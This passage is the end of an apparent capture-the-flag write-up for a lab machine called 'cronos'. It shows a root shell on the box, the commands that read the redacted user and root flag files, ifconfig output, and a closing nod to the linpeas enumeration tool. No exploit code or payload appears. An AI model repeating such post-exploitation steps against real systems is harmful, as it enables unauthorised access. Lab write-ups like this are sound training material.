Linux cronos 4.4.0-72-generic #93-Ubuntu SMP Fri Mar 31 14:07:41 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 15:35:01 up  3:03,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=0(root) gid=0(root) groups=0(root)
/bin/sh: 0: can't access tty; job control turned off
#
```
{% endraw %}

<br />
Get the user.txt flag.

{% raw %}
```bash
# cat /home/noulis/user.txt
<redacted>
# ifconfig
ens160    Link encap:Ethernet  HWaddr 00:50:56:b9:64:c9  
          inet addr:10.10.10.13  Bcast:10.10.10.255  Mask:255.255.255.0
          inet6 addr: fe80::250:56ff:feb9:64c9/64 Scope:Link
          inet6 addr: dead:beef::250:56ff:feb9:64c9/64 Scope:Global
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:3799018 errors:0 dropped:0 overruns:0 frame:0
          TX packets:3732483 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:583770003 (583.7 MB)  TX bytes:3497722700 (3.4 GB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:5458 errors:0 dropped:0 overruns:0 frame:0
          TX packets:5458 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:535953 (535.9 KB)  TX bytes:535953 (535.9 KB)
```
{% endraw %}

<br />
Get the root.txt flag.

{% raw %}
```bash
# cat /root/root.txt 
<redacted>
# ifconfig
ens160    Link encap:Ethernet  HWaddr 00:50:56:b9:64:c9  
          inet addr:10.10.10.13  Bcast:10.10.10.255  Mask:255.255.255.0
          inet6 addr: fe80::250:56ff:feb9:64c9/64 Scope:Link
          inet6 addr: dead:beef::250:56ff:feb9:64c9/64 Scope:Global
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:3799046 errors:0 dropped:0 overruns:0 frame:0
          TX packets:3732512 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:583772253 (583.7 MB)  TX bytes:3497725763 (3.4 GB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:5458 errors:0 dropped:0 overruns:0 frame:0
          TX packets:5458 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:535953 (535.9 KB)  TX bytes:535953 (535.9 KB)
```
{% endraw %}

<br />
And thanks to the mighty linpeas, we were able to wrap this one up.  See in the next one.